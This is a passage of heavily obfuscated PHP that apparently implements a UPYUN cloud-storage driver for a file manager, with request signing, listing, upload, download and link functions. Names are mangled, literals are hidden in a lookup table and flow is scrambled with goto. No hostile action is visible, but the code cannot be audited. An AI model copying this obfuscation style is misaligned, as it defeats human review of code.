$d”Ô§¬Š¤è = array("\x41\x75\164\x68\157\x72\x69\172\x61\164\x69\x6f\x6e\72\125\120\131\125\116\40{$this->username}\x3a{$F¿ÌÎéÕ©ç}", "\104\x61\164\145\x3a{$f„²ĞÉƒ£Õ}"); return $d”Ô§¬Š¤è; } public function ussRequest($c‰˜ªèÏ´î, $CØÇøÆˆø = "\x47\x45\124", $aÔä–ˆ…©Á = false, $Fƒ¯ğ÷Çî = false, $bß¥âÓ”²ò = false) { goto C›éÎÊğœ; C›éÎÊğœ: $Då¼×šŠœĞ =& $_SERVER[…ë˜õ]; $c‰˜ªèÏ´î = trim($c‰˜ªèÏ´î, $Då¼×šŠœĞ[8]); $E³Œ¡ÆáÆ° = "\x2f{$this->bucket}\x2f{$c‰˜ªèÏ´î}"; goto D¯¥åŞ‘ì; D¯¥åŞ‘ì: $AµÛ«¨‹÷ï = $this->ussHeaders($E³Œ¡ÆáÆ°, $CØÇøÆˆø); if ($Fƒ¯ğ÷Çî) { $AµÛ«¨‹÷ï = array_merge($AµÛ«¨‹÷ï, $Fƒ¯ğ÷Çî); } $F•œÃßÙÂ¾ = url_request($this->endpoint . $E³Œ¡ÆáÆ°, $CØÇøÆˆø, $aÔä–ˆ…©Á, $AµÛ«¨‹÷ï, $bß¥âÓ”²ò); goto fæ–Á‚‘ˆ; fæ–Á‚‘ˆ: if (!$F•œÃßÙÂ¾) { return array($Då¼×šŠœĞ[1091] => !1, $Då¼×šŠœĞ[1093] => $Då¼×šŠœĞ[1336]); } if (strtolower($CØÇøÆˆø) == $Då¼×šŠœĞ[189] || in_array($F•œÃßÙÂ¾[$Då¼×šŠœĞ[1091]], array($Då¼×šŠœĞ[1192], $Då¼×šŠœĞ[1337]))) { $aÔä–ˆ…©Á = $F•œÃßÙÂ¾[$Då¼×šŠœĞ[1338]]; } else { $aÔä–ˆ…©Á = json_decode($F•œÃßÙÂ¾[$Då¼×šŠœĞ[1093]], !0); if (!$aÔä–ˆ…©Á) { $aÔä–ˆ…©Á = $F•œÃßÙÂ¾[$Då¼×šŠœĞ[1093]]; } else { if (!$F•œÃßÙÂ¾[$Då¼×šŠœĞ[731]] && isset($aÔä–ˆ…©Á[$Då¼×šŠœĞ[1339]])) { $aÔä–ˆ…©Á = $aÔä–ˆ…©Á[$Då¼×šŠœĞ[1339]]; } } } return array($Då¼×šŠœĞ[1091] => $F•œÃßÙÂ¾[$Då¼×šŠœĞ[731]], $Då¼×šŠœĞ[1093] => $aÔä–ˆ…©Á); goto Bã”«ëÑÊŞ; Bã”«ëÑÊŞ: } public function mkfile($Cè¥·àÀ˜, $F‘™ëí÷Ò = '', $FÒù›ÉÍŸ = REPEAT_RENAME) { if ($this->setContent($Cè¥·àÀ˜, $F‘™ëí÷Ò)) { return $this->getPathOuter($Cè¥·àÀ˜); } return !1; } public function mkdir($A‘Á¡öà™Ó, $AÚİŠß–‰à = REPEAT_SKIP) { $dæ– ¢Õ®è =& $_SERVER[…ë˜õ]; $DÜàŞÚ¢¥º = trim($A‘Á¡öà™Ó, $dæ– ¢Õ®è[8]); if ($this->_isFolder($DÜàŞÚ¢¥º)) { return $this->getPathOuter($DÜàŞÚ¢¥º); } $aİ¹³éæ÷— = array($dæ– ¢Õ®è[1340]); $FĞë ò”•Ù = $this->ussRequest($DÜàŞÚ¢¥º, $dæ– ¢Õ®è[222], !1, $aİ¹³éæ÷—); return $FĞë ò”•Ù[$dæ– ¢Õ®è[1091]] ? $this->getPathOuter($DÜàŞÚ¢¥º) : !1; } public function copyFile($BÂ¤Ïõ‡§É, $D‹óÓ‘–³) { $C½Ğ¯ééã‰ =& $_SERVER[…ë˜õ]; $c–Çù†¦òĞ = array($C½Ğ¯ééã‰[1341] . "\57{$this->bucket}\57{$BÂ¤Ïõ‡§É}", $C½Ğ¯ééã‰[1342]); $A½êÕ¶ÆÔ˜ = $this->ussRequest($D‹óÓ‘–³, $C½Ğ¯ééã‰[224], !1, $c–Çù†¦òĞ); return $A½êÕ¶ÆÔ˜[$C½Ğ¯ééã‰[1091]] ? !0 : $this->getPathOuter($D‹óÓ‘–³); } public function moveFile($AËë«Ñ–», $eõ©•È›ôÚ) { $eß­ğÑ†ˆÊ =& $_SERVER[…ë˜õ]; $E«Øë“ß¼å = array($eß­ğÑ†ˆÊ[1343] . "\x2f{$this->bucket}\57{$AËë«Ñ–»}", $eß­ğÑ†ˆÊ[1342]); $Aí¸Ì§¦–… = $this->ussRequest($eõ©•È›ôÚ, $eß­ğÑ†ˆÊ[224], !1, $E«Øë“ß¼å); return $Aí¸Ì§¦–…[$eß­ğÑ†ˆÊ[1091]] ? !0 : $this->getPathOuter($eõ©•È›ôÚ); } public function delFile($aâ„Õ“á­±) { $aãÍÅ¸§¡Ã =& $_SERVER[…ë˜õ]; $fÇ¿ÍåèÚ˜ = $this->ussRequest($aâ„Õ“á­±, $aãÍÅ¸§¡Ã[1344]); return $fÇ¿ÍåèÚ˜[$aãÍÅ¸§¡Ã[1091]] ? !0 : !1; } public function delFolder($BÜ¾‰¡éÄÃ) { goto C¯œ—Šã‘; C¯œ—Šã‘: $b´¼’Æ‡‡› =& $_SERVER[…ë˜õ]; if (!$this->exist($BÜ¾‰¡éÄÃ)) { return !0; } $this->listItemCache = !1; goto F®•÷çç’; A‘¼˜¾®¼°: foreach ($F¡Êò¡ÔÇ¨ as $aé„äÎÙŠ¸) { $eê¨±¨ÃÕÂ = $this->ussRequest($aé„äÎÙŠ¸[$b´¼’Æ‡‡›[28]], $b´¼’Æ‡‡›[1344]); if (!$eê¨±¨ÃÕÂ[$b´¼’Æ‡‡›[1091]]) { return !1; } } foreach ($E¡¬²ƒ’’Í as $a¡‡É²‰Õ) { $eê¨±¨ÃÕÂ = $this->ussRequest($a¡‡É²‰Õ, $b´¼’Æ‡‡›[1344]); if (!$eê¨±¨ÃÕÂ[$b´¼’Æ‡‡›[1091]]) { return !1; } } $eê¨±¨ÃÕÂ = $this->ussRequest($BÜ¾‰¡éÄÃ, $b´¼’Æ‡‡›[1344]); goto A ñÙ„Š‘œ; F®•÷çç’: $E¡¬²ƒ’’Í = $F¡Êò¡ÔÇ¨ = array(); $this->fileList($BÜ¾‰¡éÄÃ, $E¡¬²ƒ’’Í, $F¡Êò¡ÔÇ¨, !0); $this->listItemCache = !0; goto A‘¼˜¾®¼°; A ñÙ„Š‘œ: return $eê¨±¨ÃÕÂ[$b´¼’Æ‡‡›[1091]]; goto fõ‘ªå; fõ‘ªå: } public function rename($D’ÃŠÃ£¹–, $Dª“ÓéË‡„) { if ($this->isFile($D’ÃŠÃ£¹–)) { $Dª“ÓéË‡„ = get_path_father($D’ÃŠÃ£¹–) . $Dª“ÓéË‡„; return $this->moveFile($D’ÃŠÃ£¹–, $Dª“ÓéË‡„); } return $this->renameObject($D’ÃŠÃ£¹–, $Dª“ÓéË‡„); } public function fileInfo($E‡Æ‘ÄÜ¥, $aˆæÇä¯µö = false, $CæÊ¬‡£õ = array()) { goto C‡¾¢¹Å‘; f÷…±±–¿í: return $FìâĞ¹Å; goto B›ß°©ã; eÜÔİ–×Š: $FìâĞ¹Å[$c¯†ËìœÕ [192]] = $FìâĞ¹Å[$c¯†ËìœÕ [83]] = 0; $FìâĞ¹Å[$c¯†ËìœÕ [193]] = $FìâĞ¹Å[$c¯†ËìœÕ [194]] = !0; if (empty($CæÊ¬‡£õ)) { $CæÊ¬‡£õ = $this->objectMeta($E‡Æ‘ÄÜ¥); if (!$CæÊ¬‡£õ) { return $FìâĞ¹Å; } } goto F‚È²Ëæè»; C‡¾¢¹Å‘: $c¯†ËìœÕ  =& $_SERVER[…ë˜õ]; $FìâĞ¹Å = array($c¯†ËìœÕ [28] => $this->pathThis($E‡Æ‘ÄÜ¥), $c¯†ËìœÕ [75] => $this->getPathOuter($c¯†ËìœÕ [8] . $E‡Æ‘ÄÜ¥), $c¯†ËìœÕ [29] => $c¯†ËìœÕ [191], $c¯†ËìœÕ [77] => isset($CæÊ¬‡£õ[$c¯†ËìœÕ [77]]) ? $CæÊ¬‡£õ[$c¯†ËìœÕ [77]] : 0, $c¯†ËìœÕ [167] => $this->ext($E‡Æ‘ÄÜ¥)); if ($aˆæÇä¯µö) { return $FìâĞ¹Å; } goto eÜÔİ–×Š; F‚È²Ëæè»: $FìâĞ¹Å[$c¯†ËìœÕ [192]] = intval($CæÊ¬‡£õ[$c¯†ËìœÕ [1345]]); $FìâĞ¹Å[$c¯†ËìœÕ [83]] = intval($CæÊ¬‡£õ[$c¯†ËìœÕ [1346]]); $FìâĞ¹Å[$c¯†ËìœÕ [77]] = $CæÊ¬‡£õ[$c¯†ËìœÕ [77]]; goto f÷…±±–¿í; B›ß°©ã: } public function folderInfo($aëˆ”åßİ, $b… —Åõ„ç = false) { goto CîÒŒ‡º; CñØóå‚Ó‰: $e¦ÙáË©«°[$fëØöçÎî[192]] = intval($E—…¢ÎÖ[$fëØöçÎî[1345]]); $e¦ÙáË©«°[$fëØöçÎî[83]] = intval($E—…¢ÎÖ[$fëØöçÎî[1346]]); return $e¦ÙáË©«°; goto AÎš¤Â‚Ïå; fÛÊˆïƒù²: $e¦ÙáË©«°[$fëØöçÎî[192]] = $e¦ÙáË©«°[$fëØöçÎî[83]] = 0; $e¦ÙáË©«°[$fëØöçÎî[193]] = $e¦ÙáË©«°[$fëØöçÎî[194]] = !0; if (empty($E—…¢ÎÖ)) { $E—…¢ÎÖ = $this->objectMeta($aëˆ”åßİ); if (!$E—…¢ÎÖ) { return $e¦ÙáË©«°; } } goto CñØóå‚Ó‰; CîÒŒ‡º: $fëØöçÎî =& $_SERVER[…ë˜õ]; $e¦ÙáË©«° = array($fëØöçÎî[28] => $this->pathThis($aëˆ”åßİ), $fëØöçÎî[75] => $this->getPathOuter($fëØöçÎî[8] . $aëˆ”åßİ), $fëØöçÎî[29] => $fëØöçÎî[76]); if ($b… —Åõ„ç) { return $e¦ÙáË©«°; } goto fÛÊˆïƒù²; AÎš¤Â‚Ïå: } private function listObjs($c©ñµ‰ˆ¥ƒ, $bå¦õ–õµ½ = 0, $FÂÃï‰¯—µ = 1000) { $E»£çÊ‡á„ =& $_SERVER[…ë˜õ]; $d °‹é¸Ò¥ = array($E»£çÊ‡á„[1347], $E»£çÊ‡á„[1348] . $FÂÃï‰¯—µ); if ($bå¦õ–õµ½) { $d °‹é¸Ò¥[] = $E»£çÊ‡á„[1349] . $bå¦õ–õµ½; } $AÕ¸·äá¬’ = $this->ussRequest($c©ñµ‰ˆ¥ƒ, $E»£çÊ‡á„[226], !1, $d °‹é¸Ò¥); return !$AÕ¸·äá¬’[$E»£çÊ‡á„[1091]] ? !1 : $AÕ¸·äá¬’[$E»£çÊ‡á„[1093]]; } private function fileList($CÁ²ÛƒÖŠ, &$Eá›„´’•«, &$c—•²¶½ÒÈ, $fôáÕ¨œ“² = false) { goto CÛ £Üá¼ñ; bàƒ¡Öœ§¸: $Bø©Äƒ¹µ = rtrim($CÁ²ÛƒÖŠ, $c†–¨îÇÊó[8]) . $c†–¨îÇÊó[8]; $E¹Ãë•ª‚ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $eñÈ¤½Ù¾Ë = $this->listObjs($CÁ²ÛƒÖŠ, $A¼èôî‹‚Ó, $c„…¾İªà); if (!$eñÈ¤½Ù¾Ë) { return !1; } $A¼èôî‹‚Ó = isset($eñÈ¤½Ù¾Ë[$c†–¨îÇÊó[1350]]) ? $eñÈ¤½Ù¾Ë[$c†–¨îÇÊó[1350]] : $c†–¨îÇÊó[33]; $Fİºèéìœ = isset($eñÈ¤½Ù¾Ë[$c†–¨îÇÊó[1351]]) ? $eñÈ¤½Ù¾Ë[$c†–¨îÇÊó[1351]] : array(); foreach ($Fİºèéìœ as $FŠŠ˜”´Ç®) { $aôâ¸«óÃ = $FŠŠ˜”´Ç®[$c†–¨îÇÊó[29]] == $c†–¨îÇÊó[76] ? !0 : !1; $f’„Çî°Õ = ltrim($Bø©Äƒ¹µ . $FŠŠ˜”´Ç®[$c†–¨îÇÊó[28]], $c†–¨îÇÊó[8]) . ($aôâ¸«óÃ ? $c†–¨îÇÊó[8] : $c†–¨îÇÊó[33]); $D«Ò¦ªÜ¢ = array($c†–¨îÇÊó[28] => $f’„Çî°Õ, $c†–¨îÇÊó[29] => $aôâ¸«óÃ ? $c†–¨îÇÊó[76] : $c†–¨îÇÊó[191], $c†–¨îÇÊó[77] => $FŠŠ˜”´Ç®[$c†–¨îÇÊó[333]], $c†–¨îÇÊó[1346] => $FŠŠ˜”´Ç®[$c†–¨îÇÊó[1352]]); if ($E¹Ãë•ª‚) { $this->cacheMethod($c†–¨îÇÊó[197], $f’„Çî°Õ, $aôâ¸«óÃ); $this->cacheMethod($c†–¨îÇÊó[198], $f’„Çî°Õ, $D«Ò¦ªÜ¢); } if ($aôâ¸«óÃ) { $Eá›„´’•«[] = $f’„Çî°Õ; if ($fôáÕ¨œ“²) { $this->fileList($f’„Çî°Õ, $Eá›„´’•«, $c—•²¶½ÒÈ, $fôáÕ¨œ“²); } continue; } $c—•²¶½ÒÈ[] = $D«Ò¦ªÜ¢; } if (count($Fİºèéìœ) < $c„…¾İªà) { break; } } goto FéÚ×…®¬‚; CÛ £Üá¼ñ: $c†–¨îÇÊó =& $_SERVER[…ë˜õ]; $A¼èôî‹‚Ó = $c†–¨îÇÊó[33]; $c„…¾İªà = 1000; goto bàƒ¡Öœ§¸; FéÚ×…®¬‚: if ($E¹Ãë•ª‚) { $this->cacheMethod($c†–¨îÇÊó[197], $CÁ²ÛƒÖŠ, !0); } goto EĞÊ¢à…ê; EĞÊ¢à…ê: } public function listPath($Døäñì‘á, $C÷ÎÄˆÈš† = false) { $C½¹›¶‡Âİ =& $_SERVER[…ë˜õ]; $bå¿É¦Ï¥‹ = $CË†ÓØ°è– = array(); $this->fileList($Døäñì‘á, $bå¿É¦Ï¥‹, $CË†ÓØ°è–); foreach ($bå¿É¦Ï¥‹ as $aì†’³‘Åç => $føÄÖæ·Ó) { $bå¿É¦Ï¥‹[$aì†’³‘Åç] = $this->folderInfo($føÄÖæ·Ó, $C÷ÎÄˆÈš†); } foreach ($CË†ÓØ°è– as $aì†’³‘Åç => $føÄÖæ·Ó) { $CË†ÓØ°è–[$aì†’³‘Åç] = $this->fileInfo($føÄÖæ·Ó[$C½¹›¶‡Âİ[28]], $C÷ÎÄˆÈš†, $føÄÖæ·Ó); } return array($C½¹›¶‡Âİ[74] => $bå¿É¦Ï¥‹, $C½¹›¶‡Âİ[73] => $CË†ÓØ°è–); } public function has($aàöÓ«ˆÁ, $CÀŞ„»ˆĞ = false, $B©ŸÍ•÷Ù‹ = true) { goto D „¾ïÆ˜÷; D „¾ïÆ˜÷: $dÒ¼‘¦š¼ =& $_SERVER[…ë˜õ]; $e©”Ÿ§˜ = $dÒ¼‘¦š¼[33]; $cˆŠ‹“Ù–± = 500; goto b¼ô¹µ…½ ; b¼ô¹µ…½ : $BÄÛ‚×É‡à = 0; $bê×áÇ§‘Ö = 0; $c¡—ŒÀêñ = rtrim($aàöÓ«ˆÁ, $dÒ¼‘¦š¼[8]) . $dÒ¼‘¦š¼[8]; goto b¢—âÆš‘Ï; b¢—âÆš‘Ï: while (!0) { check_abort(); $dô ´‡‘âß = $this->listObjs($aàöÓ«ˆÁ, $e©”Ÿ§˜, $cˆŠ‹“Ù–±); if (!$dô ´‡‘âß) { return !1; } $e©”Ÿ§˜ = isset($dô ´‡‘âß[$dÒ¼‘¦š¼[1350]]) ? $dô ´‡‘âß[$dÒ¼‘¦š¼[1350]] : $dÒ¼‘¦š¼[33]; $D…»´«ƒ„„ = isset($dô ´‡‘âß[$dÒ¼‘¦š¼[1351]]) ? $dô ´‡‘âß[$dÒ¼‘¦š¼[1351]] : array(); if (empty($D…»´«ƒ„„)) { break; } $DÄÏ¡âÆÒ¦ = array_filter($D…»´«ƒ„„, function ($aÂµ¢Æ¿Ø¤) { $c–Ğ†Ö±¥± =& $_SERVER[…ë˜õ]; return $aÂµ¢Æ¿Ø¤[$c–Ğ†Ö±¥±[29]] == $c–Ğ†Ö±¥±[76]; }); $B•õËõ‚¸Û = count($D…»´«ƒ„„); $DÄÏ¡âÆÒ¦ = count($DÄÏ¡âÆÒ¦); $fÁ¼µ‰ìµÕ = $B•õËõ‚¸Û - $DÄÏ¡âÆÒ¦; if ($CÀŞ„»ˆĞ) { $bê×áÇ§‘Ö += $DÄÏ¡âÆÒ¦; $BÄÛ‚×É‡à += $fÁ¼µ‰ìµÕ; if ($B•õËõ‚¸Û < $cˆŠ‹“Ù–±) { break; } continue; } if ($B©ŸÍ•÷Ù‹) { if ($fÁ¼µ‰ìµÕ) { return !0; } } else { if ($DÄÏ¡âÆÒ¦) { return !0; } } if ($B•õËõ‚¸Û < $cˆŠ‹“Ù–±) { break; } } if ($CÀŞ„»ˆĞ) { return array($dÒ¼‘¦š¼[201] => $BÄÛ‚×É‡à, $dÒ¼‘¦š¼[202] => $bê×áÇ§‘Ö); } return !1; goto e†½Ã†ô; e†½Ã†ô: } public function listAll($Cù’Ôà† •) { goto c£ê½©”ÍÉ; c£ê½©”ÍÉ: $CÆªŒÉÅñ =& $_SERVER[…ë˜õ]; $CÔÒ¿®è’ = $dê—Óóì¦Ø = array(); $this->fileList($Cù’Ôà† •, $CÔÒ¿®è’, $dê—Óóì¦Ø, !0); goto e³ÁØ›Ïª; e³ÁØ›Ïª: $DÀÏÅ™æó‡ = array(); foreach ($dê—Óóì¦Ø as $dó³÷—ÁŒÅ) { $DÀÏÅ™æó‡[$dó³÷—ÁŒÅ[$CÆªŒÉÅñ[28]]] = $dó³÷—ÁŒÅ[$CÆªŒÉÅñ[77]]; } foreach ($CÔÒ¿®è’ as $dó³÷—ÁŒÅ) { if (is_string($dó³÷—ÁŒÅ)) { $DÀÏÅ™æó‡[$dó³÷—ÁŒÅ] = 0; } } goto Bõ•ôİÑ‹; Bõ•ôİÑ‹: return $this->listAllFiles($Cù’Ôà† •, array_keys($DÀÏÅ™æó‡), $DÀÏÅ™æó‡); goto FºÛï«ò‚; FºÛï«ò‚: } public function canRead($F¤ÖŒÓ‹À½) { return $this->exist($F¤ÖŒÓ‹À½) ? !0 : !1; } public function canWrite($Cò´¶Œ¶ò¹) { return $this->exist($Cò´¶Œ¶ò¹) ? !0 : !1; } public function getContent($aë›µŠ¶¦Ä) { return $this->fileSubstr($aë›µŠ¶¦Ä, 0, -1); } public function setContent($E´õ‡î¨óµ, $eì¼ñ²´¸ = '') { $A»Áº³ÑÃö =& $_SERVER[…ë˜õ]; if (!$eì¼ñ²´¸) { $DÉ¿ö¦èÎá = $this->ussRequest($E´õ‡î¨óµ, $A»Áº³ÑÃö[222]); return $DÉ¿ö¦èÎá[$A»Áº³ÑÃö[1091]]; } $F—ŒÆïè‰ò = $this->tempFile($this->pathThis($E´õ‡î¨óµ)); file_put_contents($F—ŒÆïè‰ò, $eì¼ñ²´¸); if ($this->upload($E´õ‡î¨óµ, $F—ŒÆïè‰ò)) { $this->tempFileRemve($F—ŒÆïè‰ò); return !0; } return !1; } public function fileSubstr($Eà¼ÓÍ÷ƒ…, $d¿äëˆ³‹, $dø†’³ğÏ›) { $bÈ–„œÌ… =& $_SERVER[…ë˜õ]; if (!($CÄ‘ùÂêá‘ = $this->link($Eà¼ÓÍ÷ƒ…))) { return !1; } $bÊö×›†Ñ¶ = !1; if ($dø†’³ğÏ› > 0) { $aÕ³–‡» = $d¿äëˆ³‹ + $dø†’³ğÏ› - 1; $bÊö×›†Ñ¶ = array($bÈ–„œÌ…[1313] . $d¿äëˆ³‹ . $bÈ–„œÌ…[434] . $aÕ³–‡»); } $d³ŒŠëÊæ = url_request($CÄ‘ùÂêá‘, $bÈ–„œÌ…[226], !1, $bÊö×›†Ñ¶); return $d³ŒŠëÊæ[$bÈ–„œÌ…[731]] ? $d³ŒŠëÊæ[$bÈ–„œÌ…[1093]] : !1; } public function upload($CåŞæ­‚¿, $e¸ïî¡»¨, $DÊ…®àÍë = false, $Cæóîâìïô = REPEAT_REPLACE) { goto e£ôÙ’‰è; B»½ùÖƒ¦£: $AŸ…‚Ñ¹ù = $this->ussRequest($CåŞæ­‚¿, $d²Ï×Õçæ[224], !1, $a‡Éäî”ç†); return $AŸ…‚Ñ¹ù[$d²Ï×Õçæ[1091]] ? $this->getPathOuter($f™Øå˜³‘Ó) : !1; goto E¿¼ò·¨ö²; e£ôÙ’‰è: $d²Ï×Õçæ =& $_SERVER[…ë˜õ]; $B¤æ¸·ê‹ = IO::size($e¸ïî¡»¨); if ($B¤æ¸·ê‹ <= 1024 * 1024 * 200) { $Då¢‰†éÌ´ = array($d²Ï×Õçæ[1353] . $e¸ïî¡»¨); $AŸ…‚Ñ¹ù = $this->ussRequest($CåŞæ­‚¿, $d²Ï×Õçæ[224], $Då¢‰†éÌ´); return $AŸ…‚Ñ¹ù[$d²Ï×Õçæ[1091]] ? $this->getPathOuter($CåŞæ­‚¿) : !1; } goto A´ŸÆåÌ™¼; DÓì™ÓËÖ›: do { $a†©’¶óğ… = $e¡‰–’‰ìå[$d²Ï×Õçæ[1359]]; fseek_64($AÑí¬×èÇ, $B¨éÀ£ãæÚ); $c«çé÷Ì = fread($AÑí¬×èÇ, $a†©’¶óğ…); $D•°‹ÅŒù = 0; do { $D•°‹ÅŒù++; $e¡‰–’‰ìå = $this->uploadPart($CåŞæ­‚¿, $e¡‰–’‰ìå, $c«çé÷Ì); } while (!$e¡‰–’‰ìå && $D•°‹ÅŒù < 3); if (!$e¡‰–’‰ìå) { return !1; } $dœòøÙ§ƒ¨ = $e¡‰–’‰ìå[$d²Ï×Õçæ[1358]]; $B¨éÀ£ãæÚ += $a†©’¶óğ…; } while ($dœòøÙ§ƒ¨ != -1); fclose($AÑí¬×èÇ); $a‡Éäî”ç† = array($d²Ï×Õçæ[1360], $d²Ï×Õçæ[1361] . $e¡‰–’‰ìå[$d²Ï×Õçæ[1362]], $d²Ï×Õçæ[1356]); goto B»½ùÖƒ¦£; c™Š§†¼Õƒ: $dœòøÙ§ƒ¨ = $e¡‰–’‰ìå[$d²Ï×Õçæ[1358]]; $AÑí¬×èÇ = fopen($e¸ïî¡»¨, $d²Ï×Õçæ[1263]); if (!$AÑí¬×èÇ) { return !1; } goto DÓì™ÓËÖ›; A´ŸÆåÌ™¼: $c˜¾Æ¯Îõô = 1024 * 1024 * 10; $a‡Éäî”ç† = array($d²Ï×Õçæ[1354], $d²Ï×Õçæ[1355] . $B¤æ¸·ê‹, $d²Ï×Õçæ[1356], $d²Ï×Õçæ[1357] . $c˜¾Æ¯Îõô); $AŸ…‚Ñ¹ù = $this->ussRequest($CåŞæ­‚¿, $d²Ï×Õçæ[224], !1, $a‡Éäî”ç†); goto d§‚¡î¶ª¦; d§‚¡î¶ª¦: if (!$AŸ…‚Ñ¹ù[$d²Ï×Õçæ[1091]]) { return !1; } $e¡‰–’‰ìå = $AŸ…‚Ñ¹ù[$d²Ï×Õçæ[1093]]; $B¨éÀ£ãæÚ = 0; goto c™Š§†¼Õƒ; E¿¼ò·¨ö²: } private function uploadPart($B•‘†–¹œ¨, $C¨İŞÜ¬Ü–, &$bø‡”Åà™) { $dôõ¢«÷·‘ =& $_SERVER[…ë˜õ]; $a…„ÌÃ‡Ú› = array($dôõ¢«÷·‘[1363], $dôõ¢«÷·‘[1361] . $C¨İŞÜ¬Ü–[$dôõ¢«÷·‘[1362]], $dôõ¢«÷·‘[1364] . $C¨İŞÜ¬Ü–[$dôõ¢«÷·‘[1358]], $dôõ¢«÷·‘[140] . $C¨İŞÜ¬Ü–[$dôõ¢«÷·‘[1359]]); $b–¢ºª‰Ğ´ = $this->ussRequest($B•‘†–¹œ¨, $dôõ¢«÷·‘[224], $bø‡”Åà™, $a…„ÌÃ‡Ú›); return !$b–¢ºª‰Ğ´[$dôõ¢«÷·‘[1091]] ? $b–¢ºª‰Ğ´[$dôõ¢«÷·‘[1091]] : $b–¢ºª‰Ğ´[$dôõ¢«÷·‘[1093]]; } public function uploadFormData($b–Ú£øÜÈÒ, $fˆéÊ¡’«ã = 3600) { return $this->uploadPolicy($b–Ú£øÜÈÒ, $fˆéÊ¡’«ã); } public function multiUploadFormData($cã–çî…“, $bµÂŞØ×ŸØ = 3600) { $aŠµé¥Ÿ§ =& $_SERVER[…ë˜õ]; $e©‚È«ÊÏ = (int) $GLOBALS[$aŠµé¥Ÿ§[7]][$aŠµé¥Ÿ§[77]]; return $this->uploadPolicy($cã–çî…“, $bµÂŞØ×ŸØ, $e©‚È«ÊÏ); } private function uploadPolicy($fì®îò’ ğ, $aç´æ•×ß¿ = 3600, $c¸Ï“¥ÑÕ³ = 0) { goto dœ—Æ§™Ó‹; a„’ö³ÓË’: $eîÑŞÜŠ›â = base64_encode(hash_hmac($D™ÑŠ¥“·[1335], "\120\x4f\123\124\x26{$c™’’Ä²Ø‰}\46{$aø®æİ£Ïø}\x26{$A‹­Â„ì„}", md5("{$this->userpass}"), !0)); $FÌ¤ÀÄŒ = array($D™ÑŠ¥“·[1204] => $A‹­Â„ì„, $D™ÑŠ¥“·[1369] => "\x55\x50\x59\x55\116\40{$this->username}\x3a{$eîÑŞÜŠ›â}", $D™ÑŠ¥“·[174] => $this->endpoint . $c™’’Ä²Ø‰); return $FÌ¤ÀÄŒ; goto BÇíÜÌØŞ; dœ—Æ§™Ó‹: $D™ÑŠ¥“· =& $_SERVER[…ë˜õ]; $c™’’Ä²Ø‰ = $D™ÑŠ¥“·[8] . $this->bucket; $aø®æİ£Ïø = gmdate($D™ÑŠ¥“·[1300]); goto e¸æÚˆß”³; e¸æÚˆß”³: $Fõ‰â®ÜË = array($D™ÑŠ¥“·[1365] => $this->bucket, $D™ÑŠ¥“·[1366] => $fì®îò’ ğ, $D™ÑŠ¥“·[1367] => time() + $aç´æ•×ß¿, $D™ÑŠ¥“·[1368] => $aø®æİ£Ïø); if ($c¸Ï“¥ÑÕ³) { $Fõ‰â®ÜË[$D™ÑŠ¥“·[1279]] = $c¸Ï“¥ÑÕ³; } $A‹­Â„ì„ = base64_encode(json_encode($Fõ‰â®ÜË)); goto a„’ö³ÓË’; BÇíÜÌØŞ: } public function download($A¯˜ŒÇˆ–ò, $FÓ—Âˆ«ßÉ) { goto cÛôÒÉ²Ç; f¨‰¨ãĞÙ¯: $b–‹ñÑ×šÖ = 1024 * 200; $DÌºŒ®Ü = fopen($Bï»Å¿Üñ², $_SERVER[…ë˜õ][1319]); while (!0) { $CÑªáÌ•Ñ³ = $this->fileSubstr($A¯˜ŒÇˆ–ò, $C÷ÈïğÔ²™, $b–‹ñÑ×šÖ); if ($CÑªáÌ•Ñ³ === !1) { return !1; } fwrite($DÌºŒ®Ü, $CÑªáÌ•Ñ³); $C÷ÈïğÔ²™ += $b–‹ñÑ×šÖ; if (strlen($CÑªáÌ•Ñ³) < $b–‹ñÑ×šÖ) { break; } } goto eµàØ·šÍÛ; eµàØ·šÍÛ: fclose($DÌºŒ®Ü); return $FÓ—Âˆ«ßÉ; goto a¹† ƒİ©³; cÛôÒÉ²Ç: $Bï»Å¿Üñ² = IO::getPathInner(IO::mkfile($FÓ—Âˆ«ßÉ)); if (!($aØ¬ªšĞß = $this->link($A¯˜ŒÇˆ–ò))) { return !1; } $C÷ÈïğÔ²™ = 0; goto f¨‰¨ãĞÙ¯; a¹† ƒİ©³: } public function link($BáØ¼Àö»í, $FùÙ™èëÕØ = array()) { $f‚£™ÒÈ° =& $_SERVER[…ë˜õ]; $BáØ¼Àö»í = trim($BáØ¼Àö»í, $f‚£™ÒÈ°[8]); if (!empty($this->token)) { $cÁ°¬Íİ¹ = strtotime(date($f‚£™ÒÈ°[1370])); $eˆâ¼ãŒ = substr(md5($this->token . $f‚£™ÒÈ°[280] . $cÁ°¬Íİ¹ . $f‚£™ÒÈ°[1371] . $BáØ¼Àö»í), 12, 8) . $cÁ°¬Íİ¹; $FùÙ™èëÕØ[] = $f‚£™ÒÈ°[1372] . $eˆâ¼ãŒ; } $fÉïô•³ê„ = !empty($FùÙ™èëÕØ) ? $f‚£™ÒÈ°[69] . implode($f‚£™ÒÈ°[280], $FùÙ™èëÕØ) : $f‚£™ÒÈ°[33]; return $this->getHost() . $f‚£™ÒÈ°[8] . $BáØ¼Àö»í . $fÉïô•³ê„; } public function fileOut($b–«œ¼±¹, $Eä¤íÜñ¾˜ = false, $FÙŠ¯¾‘ğƒ = false, $b‹ôö±ƒÀÌ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b–«œ¼±¹, $Eä¤íÜñ¾˜, $FÙŠ¯¾‘ğƒ, $b‹ôö±ƒÀÌ); } if (!$FÙŠ¯¾‘ğƒ) { $FÙŠ¯¾‘ğƒ = $this->pathThis($b–«œ¼±¹); } $eÈç¸««—Ğ = $Eä¤íÜñ¾˜ ? array($_SERVER[…ë˜õ][1373] . rawurlencode($FÙŠ¯¾‘ğƒ)) : array(); $aÓÆƒ£¶é× = $this->link($b–«œ¼±¹, $eÈç¸««—Ğ); $this->fileOutLink($aÓÆƒ£¶é×); } public function fileOutServer($a¥¤î–, $E“í‡æ§¨ = false, $D³ÈŸ”é— = false, $F´ê’å„¦î = '') { parent::fileOut($a¥¤î–, $E“í‡æ§¨, $D³ÈŸ”é—, $F´ê’å„¦î); } public function fileOutImage($Bƒ„ÜİİŠÒ, $e‘²“¤ïö— = 250) { $EŠĞñ×õ…Û = $this->link($Bƒ„ÜİİŠÒ . $_SERVER[…ë˜õ][1374] . $e‘²“¤ïö—); $this->fileOutLink($EŠĞñ×õ…Û); } public function fileOutImageServer($e×¿èÔ‰Å›, $eã¾¶²¬İÉ = 250) { parent::fileOutImage($e×¿èÔ‰Å›, 